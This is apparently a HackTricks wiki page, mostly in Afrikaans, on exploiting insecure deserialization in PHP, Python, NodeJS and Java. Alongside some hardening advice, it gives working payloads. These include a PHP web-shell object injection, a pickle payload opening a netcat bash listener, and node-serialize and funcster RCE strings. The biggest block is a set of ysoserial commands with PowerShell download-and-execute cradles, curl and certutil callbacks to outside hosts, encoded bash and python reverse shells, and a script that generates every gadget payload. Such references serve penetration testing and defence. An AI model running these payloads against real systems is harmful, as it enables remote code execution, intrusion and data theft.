# Deserialization

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

**Serialization** word verstaan as die metode om 'n objek in 'n formaat om te skakel wat bewaar kan word, met die doel om die objek te stoor of as deel van 'n kommunikasieproses te stuur. Hierdie tegniek word algemeen gebruik om te verseker dat die objek later hergestel kan word, en dat sy struktuur en toestand behoue bly.

**Deserialization**, daarenteen, is die proses wat serialization omkeer. Dit behels die neem van data wat in 'n spesifieke formaat gestruktureer is en dit weer terug te bou tot 'n objek.

Deserialization kan gevaarlik wees omdat dit moontlik **aanvallers toelaat om die serialized data te manipuleer om harmful code uit te voer** of onverwante gedrag in die toepassing te veroorsaak tydens die objek-rekonstruksieproses.

## PHP

In PHP word spesifieke magic methods gebruik tydens die serialization- en deserialization-prosesse:

- `__sleep`: Aangeroep wanneer 'n objek serialized word. Hierdie metode behoort 'n array terug te gee met die name van alle properties van die objek wat serialized moet word. Dit word algemeen gebruik om hangende data te commit of soortgelyke opruimtake uit te voer.
- `__wakeup`: Aangeroep wanneer 'n objek deserialized word. Dit word gebruik om enige database-verbindinge wat tydens serialization verlore gegaan het te herstel en om ander herinitialiserings-take uit te voer.
- `__unserialize`: Hierdie metode word aangeroep in plaas van `__wakeup` (indien dit bestaan) wanneer 'n objek deserialized word. Dit bied meer beheer oor die deserialization-proses in vergelyking met `__wakeup`.
- `__destruct`: Hierdie metode word aangeroep wanneer 'n objek op die punt staan om vernietig te word of wanneer die script eindig. Dit word tipies gebruik vir opruimtake, soos die sluit van file handles of database-verbindinge.
- `__toString`: Hierdie metode laat 'n objek toe om as 'n string behandel te word. Dit kan gebruik word om 'n file te lees of ander take uit te voer gebaseer op die funksie-aanroepe daarin, en bied effektief 'n tekstuele voorstelling van die objek.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
As jy na die resultate kyk, kan jy sien dat die funksies **`__wakeup`** en **`__destruct`** aangeroep word wanneer die object gedeserialiseer word. Let daarop dat in verskeie tutorials jy sal vind dat die **`__toString`** funksie aangeroep word wanneer jy probeer om 'n attribuut te druk, maar blykbaar gebeur dit nie meer nie.

> [!WARNING]
> Die metode **`__unserialize(array $data)`** word aangeroep **in plaas van `__wakeup()`** as dit in die klas geïmplementeer is. Dit laat jou toe om die object te unserialize deur die geserialiseerde data as 'n array te verskaf. Jy kan hierdie metode gebruik om eienskappe te unserialize en enige nodige take by deserialisering uit te voer.
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // Perform any necessary tasks upon deserialization.
>    }
> }
> ```

Jy kan 'n verduidelikende **PHP voorbeeld** hier lees: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), hier [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) of hier [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Jy kan die PHP autoload-funksionaliteit misbruik om arbitrêre php-lêers te laai en meer:


{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### Serializing Referenced Values

As jy om 'n of ander rede 'n waarde as 'n **reference to another value serialized** wil serialize, kan jy:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### Voorkoming van PHP Object Injection met `allowed_classes`

> [!INFO]
> Ondersteuning vir die **tweede argument** van `unserialize()` (die `$options` array) is bygevoeg in **PHP 7.0**. In ouer weergawes aanvaar die funksie slegs die geserialiseerde string, wat dit onmoontlik maak om te beperk watter klasse geïnstantieer mag word.

`unserialize()` sal **elke klas** wat dit in die geserialiseerde stroom vind, instansieer, tensy anders aangedui. Sedert PHP 7 kan die gedrag beperk word met die [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php) opsie:
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
As **`allowed_classes` weggelaat word _of_ die kode op PHP < 7.0 loop**, word die oproep **gevaarlik** aangesien 'n aanvaller 'n payload kan saamstel wat magiese metodes soos `__wakeup()` of `__destruct()` misbruik om Remote Code Execution (RCE) te bewerkstellig.

#### Werklike voorbeeld: Everest Forms (WordPress) CVE-2025-52709

Die WordPress plugin **Everest Forms ≤ 3.2.2** het probeer om verdedigend op te tree met 'n helper wrapper, maar het aan die ouer PHP-weergawes vergeet:
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
Op bedieners wat nog steeds **PHP ≤ 7.0** gebruik het, het hierdie tweede tak gelei tot 'n klassieke **PHP Object Injection** toe 'n administrateur 'n kwaadaardige vormindiening oopgemaak het. 'n minimale exploit payload kan soos volg lyk:
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
Sodra die admin die inskrywing bekyk het, is die object geïnstantieer en `SomeClass::__destruct()` is uitgevoer, wat gelei het tot willekeurige kode-uitvoering.

**Belangrike punte**
1. Gee altyd `['allowed_classes' => false]` (of 'n streng witlys) wanneer `unserialize()` aangeroep word.
2. Kontroleer verdediging-wrappers – hulle vergeet dikwels die legacy PHP-branches.
3. Om slegs op te gradeer na **PHP ≥ 7.x** is *nie* voldoende nie: die opsie moet nog steeds eksplisiet voorsien word.

---

### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) kan jou help om payloads te genereer om PHP deserializations te misbruik.\
Let wel dat jy in verskeie gevalle **nie 'n manier sal vind om 'n deserialization in die bronkode** van die toepassing te misbruik nie, maar jy mag wel in staat wees om **die kode van eksterne PHP-extensions te misbruik.**\
As jy kan, kyk na die `phpinfo()` van die bediener en **soek op die internet** (en selfs na die **gadgets** van **PHPGGC**) na moontlike gadgets wat jy kan misbruik.

### phar:// metadata deserialization

If you have found a LFI that is just reading the file and not executing the php code inside of it, for example using functions like _**file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**_**.** You can try to abuse a **deserialization** occurring when **reading** a **file** using the **phar** protocol.\
For more information read the following post:


{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

When the object gets unpickle, the function \_\_\_reduce\_\_\_ will be executed.\
Wanneer dit uitgebuit word, kan die bediener 'n fout teruggee.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Before checking the bypass technique, try using `print(base64.b64encode(pickle.dumps(P(),2)))` to generate an object that is compatible with python2 if you're running python3.

For more information about escaping from **pickle jails** check:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

Die volgende bladsy stel die tegniek voor om **'n onveilige deserialisering in yaml python-biblioteke te misbruik** en sluit af met 'n tool wat gebruik kan word om RCE deserialization payloads te genereer vir **Pickle, PyYAML, jsonpickle and ruamel.yaml**:


{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)


{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS **het nie "magic" funksies** soos PHP of Python wat net deur die skepping van 'n object uitgevoer word nie. Maar dit het sekere **funksies** wat **gereeld gebruik word selfs sonder direkte aanroep** soos **`toString`**, **`valueOf`**, **`toJSON`**.\
As jy 'n deserialisering misbruik kan jy hierdie funksies **kompromitteer om ander kode uit te voer** (potentially abusing prototype pollutions) en so arbitraire kode uitvoer wanneer hulle aangeroep word.

Nog 'n **"magic" manier om 'n funksie aan te roep** sonder om dit direk te noem, is deur **'n object wat teruggegee word deur 'n async function te kompromitteer** (promise). Want as jy daardie **return object** omskep in 'n ander **promise** met 'n **property** genaamd **"then" of tipe function**, sal dit **uitgevoer** word net omdat dit deur 'n ander promise teruggegee is. _Volg_ [_**this link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _vir meer inligting._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` and `prototype` pollution

As jy meer oor hierdie tegniek wil leer **kyk na die volgende handleiding**:


{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Hierdie biblioteek laat toe om funksies te serialiseer. Voorbeeld:
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
Die **geserialiseerde objek** sal soos volg lyk:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Jy kan in die voorbeeld sien dat wanneer 'n funksie geserialiseer word die `_$$ND_FUNC$$_` flag aan die geserialiseerde objek aangeheg word.

Inside the file `node-serialize/lib/serialize.js` you can find the same flag and how the code is using it.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

Soos jy in die laaste kodeblok kan sien, **as die vlag gevind word** word `eval` gebruik om die funksie te deserialiseer, so basies **gebruikerinvoer binne die `eval` funksie gebruik word**.

Egter, **net om 'n funksie te serialiseer** gaan dit nie uitvoer nie aangesien dit nodig sou wees dat 'n deel van die kode **`y.rce` aanroep** in ons voorbeeld en dit is uiters **onwaarskynlik**.\
Enigiemand kan egter net die **geserialiseerde objek wysig** deur **'n paar hakies by te voeg** sodat die geserialiseerde funksie outomaties uitgevoer word wanneer die objek gedeserialiseer word.\
In die volgende kodeblok **let op die laaste hakie** en hoe die `unserialize` funksie die kode outomaties sal uitvoer:
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
Soos voorheen aangedui, sal hierdie biblioteek die code kry na `_$$ND_FUNC$$_` en dit met `eval` **uitvoer**. Daarom, om **auto-execute code** te doen, kan jy **verwyder die gedeelte wat die funksie skep** en die laaste hakie verwyder en **net 'n JS oneliner uitvoer** soos in die volgende voorbeeld:
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
Jy kan [**find here**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **verdere inligting** vind oor hoe om hierdie vulnerability te exploit.

### [funcster](https://www.npmjs.com/package/funcster)

’n Noemenswaardige aspek van **funcster** is die ontoeganklikheid van **standard built-in objects**; dit val buite die toeganklike scope. Hierdie beperking verhoed dat code uitgevoer word wat probeer om metodes op ingeboude objects aan te roep, wat lei tot uitzonderings soos "ReferenceError: console is not defined" wanneer kommando's soos `console.log()` of `require(something)` gebruik word.

Ten spyte van hierdie beperking is dit moontlik om volle toegang tot die globale konteks te herstel, insluitend alle **standard built-in objects**, deur ’n spesifieke benadering. Deur die globale konteks direk te benut, kan mens hierdie beperking omseil. Byvoorbeeld, toegang kan heringestel word deur die volgende snippet:
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**Vir**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Die **serialize-javascript** pakket is uitsluitlik ontwerp vir serialization-doeleindes en het geen ingeboude deserialization-vermoëns nie. Gebruikers is verantwoordelik om hul eie metode vir deserialization te implementeer. Die amptelike voorbeeld stel 'n direkte gebruik van `eval` voor vir die deserializing van serialized data:
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
As hierdie funksie gebruik word om objekte te deserialize, kan jy dit **maklik exploit**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Vir**[ **meer inligting lees hierdie bron**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo biblioteek

In die volgende bladsye vind jy inligting oor hoe om hierdie biblioteek te misbruik om arbitrêre opdragte uit te voer:

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

In Java word **deserialization callbacks uitgevoer gedurende die proses van deserialization**. Hierdie uitvoering kan uitgebuit word deur aanvallers wat kwaadwillige payloads vervaardig wat hierdie callbacks aktiveer, wat kan lei tot die uitvoering van skadelike aksies.

### Fingerprints

#### White Box

Om potensiële serialization kwesbaarhede in die codebase te identifiseer, soek na:

- Klasse wat die `Serializable` interface implementeer.
- Gebruik van `java.io.ObjectInputStream`, `readObject`, `readUnshare` funksies.

Gee ekstra aandag aan:

- `XMLDecoder` gebruik met parameters wat deur eksterne gebruikers gedefinieer is.
- Die `XStream` se `fromXML` metode, veral as die XStream-weergawe kleiner of gelyk is aan 1.46, aangesien dit vatbaar is vir serialization probleme.
- `ObjectInputStream` gekoppel aan die `readObject` metode.
- Implementering van metodes soos `readObject`, `readObjectNodData`, `readResolve`, of `readExternal`.
- `ObjectInputStream.readUnshared`.
- Algemene gebruik van `Serializable`.

#### Black Box

Vir black box toetsing, soek na spesifieke **signatures of "Magic Bytes"** wat java serialized objects aandui (voortkomend van `ObjectInputStream`):

- Heksadesimale patroon: `AC ED 00 05`.
- Base64 patroon: `rO0`.
- HTTP response headers met `Content-type` gestel op `application/x-java-serialized-object`.
- Heksadesimale patroon wat voorafgaande kompressie aandui: `1F 8B 08 00`.
- Base64 patroon wat voorafgaande kompressie aandui: `H4sIA`.
- Web-lêers met die `.faces` uitbreiding en die `faces.ViewState` parameter. Die ontdekking van hierdie patrone in 'n webtoepassing moet 'n ondersoek uitlok soos uiteengesit in die [pos oor Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Kontroleer of dit kwesbaar is

As jy wil **leer hoe 'n Java Deserialized exploit werk**, behoort jy te kyk na [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md), en [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### SignedObject-gated deserialization en pre-auth bereikbaarheid

Moderne kodebasisse verpak soms deserialization met `java.security.SignedObject` en valideer 'n handtekening voordat hulle `getObject()` aanroep (wat die binneste objek deserialiseer). Dit verhoed arbitrêre top-level gadget classes, maar kan steeds uitgebuit word as 'n aanvaller 'n geldige signature kan bekom (bv. private-key compromise of 'n signing oracle). Daarbenewens kan foutafhandelingsvloei session-bound tokens vir unauthenticated users uitreik, en sodoende andersins beskermde sinks pre-auth blootstel.

Vir 'n konkrete gevallestudie met requests, IoCs, en hardening guidance, sien:

{{#ref}}
java-signedobject-gated-deserialization.md
{{#endref}}

#### White Box Test

Jy kan nagaan of enige toepassing met bekende kwesbaarhede geïnstalleer is.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Jy kan probeer om **alle biblioteke te kontroleer** wat bekend is as kwesbaar en waarvoor [**Ysoserial** ](https://github.com/frohoff/ysoserial) kan provide an exploit for. Or jy kan die biblioteke ondersoek wat op [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json) aangedui word.\
Jy kan ook gebruik maak van [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) om na moontlike gadget chains te soek wat uitgebuit kan word.\
Wanneer jy **gadgetinspector** laat loop (na dit gebou is) ignoreer die hoop waarskuwings/foute wat dit deurmaak en laat dit klaar loop. Dit sal al die bevindings skryf onder _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Let asseblief daarop dat **gadgetinspector won't create an exploit and it may indicate false positives**.

#### Swartboks-toets

Met die Burp-uitbreiding [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) kan jy identifiseer **watter biblioteke beskikbaar is** (en selfs die weergawes). Met hierdie inligting kan dit **makkelijker wees om 'n payload te kies** om die kwesbaarheid uit te buit.\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe fokus op **`ObjectInputStream` deserializations**.

Met die Burp-uitbreiding [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) kan jy **kwesbare biblioteke identifiseer** wat met ysoserial uitgebuit kan word en dit **uitbuit**.\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner fokus op **`ObjectInputStream`** deserializations.

Jy kan ook [**Freddy**](https://github.com/nccgroup/freddy) gebruik om **deserializations** kwesbaarhede in **Burp** op te spoor. Hierdie plugin sal **nie net `ObjectInputStream`-verwante kwesbaarhede** opspoor nie, maar **ook** kwesbaarhede van **Json** en **Yml** deserialisasie-biblioteke. In aktiewe modus sal dit probeer om dit te bevestig deur sleep of DNS payloads te gebruik.\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialization Test**

Dit gaan nie net oor om te kontroleer of enige kwesbare biblioteek deur die bediener gebruik word nie. Soms kan jy die data binne die serialized object verander en sekere kontroles omseil (miskien om jou admin-privileges in 'n webapp te gee).\
As jy 'n java serialized object vind wat na 'n web application gestuur word, **kan jy** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **gebruik om die serialization object wat gestuur word in 'n meer menslik leesbare formaat uit te druk**. As jy weet watter data jy stuur, sal dit makliker wees om dit te wysig en sekere kontroles te omseil.

### **Exploit**

#### **ysoserial**

Die hoofinstrument om Java deserializations uit te buit is [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Jy kan ook oorweeg om [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) te gebruik, wat jou toelaat om meer komplekse commands te gebruik (byvoorbeeld met pipes).\
Let daarop dat hierdie tool gefokus is op die uitbuiting van **`ObjectInputStream`**.\
Ek sou begin deur die **"URLDNS"** payload te gebruik **voor 'n RCE** payload om te toets of die injectie moontlik is. In elk geval, let daarop dat die "URLDNS" payload moontlik nie werk nie, terwyl 'n ander RCE payload wel kan werk.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Wanneer jy 'n payload skep vir **java.lang.Runtime.exec()** kan jy **nie spesiale karakters gebruik** soos ">" of "|" om die uitvoer van 'n uitvoering te herlei, "$()" om opdragte uit te voer of selfs **argumente** aan 'n opdrag deur **spasies** geskei te gee (jy kan `echo -n "hello world"` doen maar jy kan nie `python2 -c 'print "Hello World"'` doen nie). Om die payload korrek te enkodeer kan jy [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html).

Voel vry om die volgende skrip te gebruik om **all the possible code execution** payloads vir Windows en Linux te skep en dit dan op die kwesbare webblad te toets:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Jy kan **gebruik** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **saam met ysoserial om meer exploits te skep**. Meer inligting oor hierdie tool in die **slides van die praatjie** waar die tool aangebied is: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec) kan gebruik word om payloads te genereer om verskillende **Json** en **Yml** serialiseringsbiblioteke in Java te exploit.\
Om die projek te compile, moes ek hierdie **dependencies** by `pom.xml` **add**:
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Installeer maven**, en **kompileer** die projek:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Lees meer oor hierdie Java JSON-biblioteek: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

- If you want to test some ysoserial payloads you can **run this webapp**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Why

Java gebruik serialisering baie vir verskeie doeleindes, soos:

- **HTTP requests**: Serialisering word wyd gebruik in die hantering van parameters, ViewState, cookies, ens.
- **RMI (Remote Method Invocation)**: Die Java RMI-protokol, wat heeltemal op serialisering staatmaak, is 'n hoeksteen vir verafkommunikasie in Java-toepassings.
- **RMI over HTTP**: Hierdie metode word algemeen gebruik deur Java-gebaseerde thick client web-toepassings, wat serialisering vir alle objekkommunikasie gebruik.
